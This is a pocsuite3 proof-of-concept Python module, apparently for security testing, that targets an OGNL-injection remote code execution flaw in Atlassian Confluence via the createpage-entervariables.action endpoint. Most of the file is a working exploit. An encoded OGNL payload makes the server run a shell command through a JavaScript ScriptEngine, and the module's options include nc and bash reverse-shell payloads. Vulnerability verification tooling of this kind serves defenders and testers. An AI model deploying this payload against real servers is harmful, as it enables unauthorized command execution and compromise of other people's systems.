import base64
import binascii
from collections import OrderedDict
from urllib.parse import urljoin

import argparse
import struct
import random
import string
import requests
import re
import threading
import sys

from requests.exceptions import ReadTimeout

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, \
    OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

from bs4 import BeautifulSoup


class DemoPOC(POCBase):
    vulID = '1'  # ssvid
    version = '3.0'
    author = ['N0puple']
    vulDate = '2018-06-14'
    createDate = '2018-06-14'
    updateDate = '2018-06-14'
    references = ['https://www.seebug.org/vuldb/ssvid-97343']
    name = 'confluence ognl to rce'
    appPowerLink = ''
    appName = 'confluence'
    appVersion = '2.x,3.x'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''confluence ognl to rce'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    pocDesc = '''confluence ognl to rce'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description='攻击时自定义命令')
        o["app_version"] = OptItems(['2.x', 'Auto'], selected="Auto", description='目标版本，可自动匹配')
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def _check_verify(self, url):
        cmd = "whoami"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", 
            "Connection": "close", 
            "Content-Type": "application/x-www-form-urlencoded", 
            "Accept-Encoding": "gzip, deflate"
        }
        data = {
            "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"
        }
        rawHTML = requests.post(url, headers=headers, data=data)
        soup = BeautifulSoup(rawHTML.text, 'html.parser')
        queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
        if "aaaaaaaa" in queryStringValue and "ScriptEngineManager" not in queryStringValue:
            return True
        return False

    def _verify(self):
        result = {}
        try:
            baseurl = urljoin(self.url, '/')
            url = requests.get(baseurl).url
            url = url.split("login.action")[0]
            url = urljoin(url, 'pages/createpage-entervariables.action?SpaceKey=x')
            p = self._check_verify(url)
            if p:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
            return self.parse_output(result)
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not detected vulnerable')
        return output


register_poc(DemoPOC)
